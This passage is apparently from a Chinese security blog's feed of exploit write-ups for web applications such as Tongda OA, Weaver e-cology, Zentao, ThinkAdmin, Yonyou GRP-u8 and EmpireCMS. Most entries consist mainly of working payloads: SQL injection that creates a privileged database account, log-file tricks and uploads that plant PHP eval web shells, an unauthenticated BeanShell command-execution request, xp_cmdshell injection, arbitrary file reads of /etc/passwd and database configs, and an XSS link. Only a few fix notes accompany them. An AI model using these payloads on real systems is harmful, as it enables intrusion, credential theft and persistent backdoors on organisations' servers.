192.168.77.137</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://192.168.77.137/general/index.php?isIE=0&amp;modify_pwd=0</span><br><span class="line">Cookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><a href="javascript:void(0" target="_blank" rel="noopener"><img src="通达OA 11.7存在sql注入/copycode.gif" alt="复制代码"></a>;)</p><p>3、经过测试，过滤了一些函数(sleep、报错的函数等等)，各种注释，使用payload：select if((1=1),1,power(9999,99))、select if((1=2),1,power(9999,99))，判断注入点  #当字符相等时，不报错，错误时报错</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918131448196-369801189.png" alt="img"></p><p><img src="通达OA 11.7存在sql注入/1592114-20200918131457270-1072697018.png" alt="img"></p><p>4、通过添加用户at666，密码为abcABC@123</p><p>grant all privileges ON mysql.* TO ‘at666‘@’%’ IDENTIFIED BY ‘abcABC@123’ WITH GRANT OPTION</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918140833664-1709732465.png" alt="img"></p><p>5、使用Navicat Premium连接数据库</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918140944759-1969707413.png" alt="img"></p><p>6、添加的账户不能直接通过日志慢查询写入文件，需要给创建的账户添加权限</p><p>UPDATE <code>mysql</code>.<code>user</code> SET <code>Password</code> =  ‘*DE0742FA79F6754E99FDB9C8D2911226A5A9051D’, <code>Select_priv</code> = ‘Y’,  <code>Insert_priv</code> = ‘Y’, <code>Update_priv</code> = ‘Y’, <code>Delete_priv</code> = ‘Y’,  <code>Create_priv</code> = ‘Y’, <code>Drop_priv</code> = ‘Y’, <code>Reload_priv</code> = ‘Y’,  <code>Shutdown_priv</code> = ‘Y’, <code>Process_priv</code> = ‘Y’, <code>File_priv</code> = ‘Y’,  <code>Grant_priv</code> = ‘Y’, <code>References_priv</code> = ‘Y’, <code>Index_priv</code> = ‘Y’,  <code>Alter_priv</code> = ‘Y’, <code>Show_db_priv</code> = ‘Y’, <code>Super_priv</code> = ‘Y’,  <code>Create_tmp_table_priv</code> = ‘Y’, <code>Lock_tables_priv</code> = ‘Y’, <code>Execute_priv</code> = ‘Y’, <code>Repl_slave_priv</code> = ‘Y’, <code>Repl_client_priv</code> = ‘Y’,  <code>Create_view_priv</code> = ‘Y’, <code>Show_view_priv</code> = ‘Y’, <code>Create_routine_priv</code> = ‘Y’, <code>Alter_routine_priv</code> = ‘Y’, <code>Create_user_priv</code> = ‘Y’, <code>Event_priv</code> = ‘Y’, <code>Trigger_priv</code> = ‘Y’, <code>Create_tablespace_priv</code> = ‘Y’, <code>ssl_type</code> = ‘’, <code>ssl_cipher</code> = ‘’, <code>x509_issuer</code> = ‘’, <code>x509_subject</code> = ‘’,  <code>max_questions</code> = 0, <code>max_updates</code> = 0, <code>max_connections</code> = 0,  <code>max_user_connections</code> = 0, <code>plugin</code> = ‘mysql_native_password’,  <code>authentication_string</code> = ‘’, <code>password_expired</code> = ‘Y’ WHERE <code>Host</code> =  Cast(‘%’ AS Binary(1)) AND <code>User</code> = Cast(‘at666’ AS Binary(5));</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918145139982-1847080322.png" alt="img"></p><p>7、然后用注入点刷新权限，因为该用户是没有刷新权限的权限的</p><p>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918145242794-1741869790.png" alt="img"></p><p>8、再次登录，提示密码过期，需要重新执行grant all privileges ON mysql.* TO ‘at666‘@’%’ IDENTIFIED BY ‘abcABC@123’ WITH GRANT OPTION</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918145636404-104307491.png" alt="img"></p><p><img src="通达OA 11.7存在sql注入/1592114-20200918145658609-861750253.png" alt="img"></p><p>9、然后写shell</p><p>方法一:</p><p>select @@basedir;</p><p>set global slow_query_log=on;</p><p>set global slow_query_log_file=’C:/tongda11.7/webroot/test.php’;</p><p>select ‘&lt;?php eval($_POST[x]);?&gt;’ or sleep(11);</p><p>方法二:</p><p>select @@basedir;</p><p>set global general_log = on;</p><p>set global general_log_file =’C:/tongda11.7/webroot/test2.php’;</p><p>select ‘&lt;?php eval($_POST[test2]);?&gt;’;</p><p>show variables like ‘%general%’;</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918150409778-1231690665.png" alt="img"></p><p><img src="通达OA 11.7存在sql注入/1592114-20200918151144656-338989695.png" alt="img"></p><p>10、菜刀连接</p><p><img src="通达OA 11.7存在sql注入/1592114-20200918150531898-678705329.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15148 Yii框架反序列化远程命令执行</title>
      <link href="/2020/09/19/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/09/19/01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>如果在使用yii框架，并且在用户可以控制的输入处调用了unserialize()并允许特殊字符的情况下，会受到反序列化远程命令命令执行漏洞攻击。 该漏洞只是php 反序列化的执行链，必须要配合unserialize函数才可以达到任意代码执行的危害。 该反序列化执行链在今年8月初已经公开，建议使用yii框架的同学排查</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Yii2 &lt;2.0.38</p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>目前官方已经禁止BatchQueryResult类被反序列化</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><a href="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_0171f9713e19e39b37513be95b25aef8.jpg"><img src="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_0171f9713e19e39b37513be95b25aef8.jpg" alt></a> <a href="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_8192d4a76e049f0162f948ad2d43eebc.jpg"><img src="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_8192d4a76e049f0162f948ad2d43eebc.jpg" alt></a> <a href="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_98c0f4ebac48a4063a016b1dcbee92cd.jpg"><img src="./CVE-2020-15148 Yii框架反序列化远程命令执行/wp_editor_md_98c0f4ebac48a4063a016b1dcbee92cd.jpg" alt></a> exp.txt <a href="./CVE-2020-15148 Yii框架反序列化远程命令执行/POC.txt">CVE-2020-15148 Yii框架反序列化RCE利用链</a></p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99" target="_blank" rel="noopener">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a> <a href="https://xz.aliyun.com/t/8082#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/8082#toc-8</a> <a href="https://github.com/AFKL-CUIT/phpggc/" target="_blank" rel="noopener">https://github.com/AFKL-CUIT/phpggc/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微OA Bsh 远程代码执行漏洞</title>
      <link href="/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h4><p>泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p><code>`</code><br>POST /weaver/bsh.servlet.BshServlet HTTP/1.1<br>Host: xxxxxxxx:8088<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Length: 98<br>Content-Type: application/x-www-form-urlencoded</p><p>bsh.script=eval%00(“ex”%2b”ec(\”whoami\”)”);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw<br><code>`</code>防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禅道11.6RCE漏洞</title>
      <link href="/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>禅道 11.6</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>文件写入</p><h3 id="漏洞范围-1"><a href="#漏洞范围-1" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>禅道 11.6</p><h3 id="漏洞POC-1"><a href="#漏洞POC-1" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><h2 id="三-远程代码执行漏洞"><a href="#三-远程代码执行漏洞" class="headerlink" title="三.远程代码执行漏洞"></a>三.远程代码执行漏洞</h2><p>1）远程代码执行命令phpnifo()；</p><p>Payload 1:</p><p><a href="http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=1111" target="_blank" rel="noopener">http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=1111</a></p><p>POST: fileContent=&lt;?php phpinfo(); ?&gt;</p><p><img src="禅道11.6RCE漏洞/20200909170608141.png" alt="img"></p><p>Payload2:</p><p><a href="http://127.0.0.1/zentaopms/www/" target="_blank" rel="noopener">http://127.0.0.1/zentaopms/www/</a> api-getModel-api-getMethod-filePath=1111/1</p><p>POST: fileContent=&lt;?php phpinfo(); ?&gt;</p><p><img src="禅道11.6RCE漏洞/20200909170608208.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2）远程代码执行命令system(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure><p>Payload 1:</p><p><a href="http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=2222" target="_blank" rel="noopener">http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=2222</a></p><p>POST: fileContent=&lt;?php system(‘whoami’); ?&gt;</p><p><img src="禅道11.6RCE漏洞/20200909170608153.png" alt="img"></p><p>Payload 2:</p><p><a href="http://127.0.0.1/zentaopms/www/" target="_blank" rel="noopener">http://127.0.0.1/zentaopms/www/</a> api-getModel-api-getMethod-filePath=2222/2</p><p>POST: fileContent=&lt;?php system(‘whoami’); ?&gt;</p><p><img src="禅道11.6RCE漏洞/20200909170608326.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禅道11.6任意文件读取</title>
      <link href="/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>禅道 11.6</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="禅道11.6任意文件读取/2020090917060866.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禅道11.6后台SQL注入</title>
      <link href="/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/09/17/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>禅道 11.6</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>Payload:</p><p><a href="http://127.0.0.1/zentaopms/www/api-getModel-api-sql-sql=select+account,password+from+zt_user" target="_blank" rel="noopener">http://127.0.0.1/zentaopms/www/api-getModel-api-sql-sql=select+account,password+from+zt_user</a></p><p><img src="禅道11.6后台SQL注入/20200909170607989.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禅道8.2-9.2.1注入GetShell</title>
      <link href="/2020/09/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/"/>
      <url>/2020/09/16/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/</url>
      
        <content type="html"><![CDATA[<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>禅道8.9-9.2.1</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>读取版本号：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://********/index.php?mode=getconfig </span><br><span class="line">```查看忘记密码文本路径：</span><br></pre></td></tr></table></figure></p><p>http://<strong><em>**</em></strong>/zentao/user-reset.html </p><p>exp及使用方法： 在链接中输入构造好的语句base64编码后字符串即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkAdmin v6 列目录任意文件读取</title>
      <link href="/2020/09/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/ThinkAdmin%20v6%20%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/09/16/01-CMS%E6%BC%8F%E6%B4%9E/Thinkadmin/ThinkAdmin%20v6%20%E5%88%97%E7%9B%AE%E5%BD%95%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>ThinkAdmin v6 列目录任意文件读取 V5前，直接也能读取 列目录 poc: version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞 <a href="http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version" target="_blank" rel="noopener">http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version</a> 读取网站根目录Payload: <a href="http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node" target="_blank" rel="noopener">http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node</a> post:rules=[“/“] 也可以使用../来进行目录穿越-》 rules=[“../../../“] 任意文件读取 需要进行encode() 加密一下字符串 On Windows read database.php payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database.php   =&gt;  public/static/../../config/database&quot;php</span><br><span class="line">/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34 </span><br><span class="line">```On Linux read /etc/passwd payload:</span><br></pre></td></tr></table></figure></p><p>/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s<br><code>`</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>泛微云桥任意文件读取</title>
      <link href="/2020/09/13/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/09/13/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。<br>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。<br><img src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQKpmtXbajxJeCjHCBYqpibImvE1DOSubqOjI9tXr1q5XPibbsFJzsI89RQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>2、通过查看文件接口访问 /file/fileNoLogin/id<br><img src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7TLAfCC3eicZeiatLHb6PtFQK9pcoRWC2r3Hp58NZx3BPJbmqC0iaKsZ4zBsCiaqNHvK1trtsC0ZQS15g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><h2 id="泛微云桥任意文件读取升级玩法。"><a href="#泛微云桥任意文件读取升级玩法。" class="headerlink" title="泛微云桥任意文件读取升级玩法。"></a>泛微云桥任意文件读取升级玩法。</h2><p>1、简单说说泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。<br>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”<br>/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///D:/&amp;fileExt=txt<br><img src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7SSJOGRbwFbueTWTmOcwYNpiboItvQI3dQ56siaxTNLicBDh8AuAhnp5wVMYfM3D92IiaYPdpoerYGb2g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。<br>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties<br>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库<br><img src="https://mmbiz.qpic.cn/mmbiz_png/gEVuGz7Ip7SSJOGRbwFbueTWTmOcwYNpRwROibBRiawD1PPxah8KfzahTdia2ertJZcLibibVbxzvWXSvwUaZnFSByA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt></p><p>修复建议:<br>关闭程序路由 /file/fileNoLogin</p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用友 GRP-u8注入漏洞</title>
      <link href="/2020/09/11/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/11/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20GRP-u8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>GRP-u8</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /Proxy HTTP/1.1</span><br><span class="line">Accept: Accept: */*</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)</span><br><span class="line">Host: host</span><br><span class="line">Content-Length: 357</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;&lt;R9PACKET version=&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;exec xp_cmdshell &apos;ipconfig&apos;&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS V7.5后台getshell漏洞</title>
      <link href="/2020/09/10/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/10/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>EmpireCMS &lt;= 7.5</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1.进入后台如下界面，点击导入系统模型 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/15996690221.png" alt> 2.构造文件a.mod,内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;);?&gt;</span><br></pre></td></tr></table></figure><p>3.上传文件a.mod <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/15996691631.png" alt> 4.查看文件已经有shell.php了，菜刀连接即可 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/YZ2MSEV1TXX7J08ZXCA01.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS V7.5后台xss漏洞</title>
      <link href="/2020/09/09/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/09/09/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>EmpireCMS &lt;=7.5</p><h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>需要有后台权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p>若提示非法来源加入参数hash参数，例：ehash_gxCQz=zERR2KY6NAMicC0c5OYv,如下 <img src="EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/15996652611.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://********/e/admin/openpage/AdminPage.php?mainfile=javascript:alert(/xss/)&amp;ehash_gxCQz=zERR2KY6NAMicC50Yv</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS</title>
      <link href="/2020/09/08/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/"/>
      <url>/2020/09/08/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h3><p>EmpireCMS &lt;= V7.5</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>由于后端没有对执行的语句做限制导致可以执行恶意sql语句。 <img src="EmpireCMS/HOH@WWOHVQOVSR5K9.png" alt> POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[1])?&gt;&apos; into outfile &apos;D:/phpstudy_pro/WWW/shell.php&apos;</span><br></pre></td></tr></table></figure><p>根据实际路径修改路径即可。 <img src="EmpireCMS/7MGWYGAV0VX0AO6JNOC3.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 白阁-漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EmpireCMS V7.5后台任意代码执行漏洞</title>
      <link href="/2020/09/07/01-CMS%E6%BC%8F%E6%B4%9E/EmpireCMS/EmpireCMS%20V7.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
